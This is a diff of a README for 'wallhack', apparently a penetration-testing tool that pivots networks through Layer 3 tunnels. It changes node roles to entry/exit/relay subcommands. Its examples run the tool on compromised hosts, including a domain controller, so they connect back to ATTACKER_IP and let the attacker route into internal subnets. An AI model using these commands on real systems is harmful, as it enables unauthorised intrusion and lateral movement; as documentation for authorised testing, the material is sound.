@@ -11,27 +11,30 @@ Layer 3 tunneling tool for network pivoting.
 
 ## Concepts
 
-**Entry** — Probably your machine. Traffic "enters" here. Runs with `--listen`
-only.
+**Entry** — Your machine. Traffic enters the tunnel here. Creates a TUN
+interface and runs an interactive REPL.
 
-**Relay** — A host that forwards traffic deeper into the network. Runs with both
-`--connect` and `--listen`.
+**Relay** — A host that forwards traffic deeper into the network. Connects
+upstream and listens downstream.
 
-**Exit** — End of the chain. Unwraps packetswe dont ne and sends them to the local
-network. Runs with `--connect` only.
+**Exit** — End of the chain. Unwraps packets and sends them to the local
+network via syscalls.
 
-## Flags
+## Commands
+
+Node role is declared explicitly via subcommand. Transport direction
+(`--listen` / `--connect`) is independent of role.
+
+| Command   | Description                                  |
+| --------- | -------------------------------------------- |
+| `entry`   | Entry node (TUN + REPL). Default if omitted. |
+| `exit`    | Exit node (syscalls to local network).       |
+| `relay`   | Relay node (forwards between peers).         |
 
 | Flag                  | Description                   |
 | --------------------- | ----------------------------- |
 | `--listen :PORT`      | Accept incoming connections   |
 | `--connect HOST:PORT` | Establish outgoing connection |
-
-Behavior emerges from flag combinations:
-
-- `--listen` = entry
-- `--connect --listen` = relay
-- `--connect` = exit
 
 ## Usage
 
@@ -42,13 +45,13 @@ Simplest case. One compromised host, direct tunnel.
 **Attacker (entry):**
 
 ```bash
-wallhack --listen :443
+wallhack entry --listen :443
 ```
 
 **Compromised host (exit):**
 
 ```bash
-./wallhack --connect ATTACKER_IP:443
+./wallhack exit --connect ATTACKER_IP:443
 ```
 
 **Attacker — add routes:**
@@ -65,19 +68,19 @@ When deeper targets can't reach you directly, chain through a relay.
 **Attacker (entry):**
 
 ```bash
-wallhack --listen :443
+wallhack entry --listen :443
 ```
 
 **DMZ host (relay):**
 
 ```bash
-./wallhack --connect ATTACKER_IP:443 --listen :6565
+./wallhack relay --connect ATTACKER_IP:443 --listen :6565
 ```
 
 **Internal host (exit):**
 
 ```bash
-./wallhack --connect DMZ_IP:6565
+./wallhack exit --connect DMZ_IP:6565
 ```
 
 **Attacker — add routes:**
@@ -100,13 +103,13 @@ Web server (10.0.0.10) can reach your machine and the office network. DC
 **Attacker (203.0.113.50):**
 
 ```bash
-wallhack --listen :443
+wallhack entry --listen :443
 ```
 
 **Web server (10.0.0.10) — relay:**
 
 ```bash
-./wallhack --connect 203.0.113.50:443 --listen :6565
+./wallhack relay --connect 203.0.113.50:443 --listen :6565
 ```
 
 **Attacker — route to DMZ and office:**
@@ -119,7 +122,7 @@ ip route add 10.1.0.0/24 dev tun0
 **DC (10.1.0.1) — exit:**
 
 ```bash
-./wallhack --connect 10.0.0.10:6565
+./wallhack exit --connect 10.0.0.10:6565
 ```
 
 **Attacker — route to secret subnet:**
@@ -129,6 +132,22 @@ ip route add 10.2.0.0/24 dev tun0
 ```
 
 Traffic to 10.2.0.0/24 flows: Attacker → Web server → DC → Target.
+
+### Reverse Tunnel
+
+When the exit node can't reach you, but you can reach it:
+
+**Compromised host (exit, listening):**
+
+```bash
+./wallhack exit --listen :443
+```
+
+**Attacker (entry, connecting):**
+
+```bash
+wallhack entry --connect COMPROMISED_IP:443
+```
 
 ## Installation
 
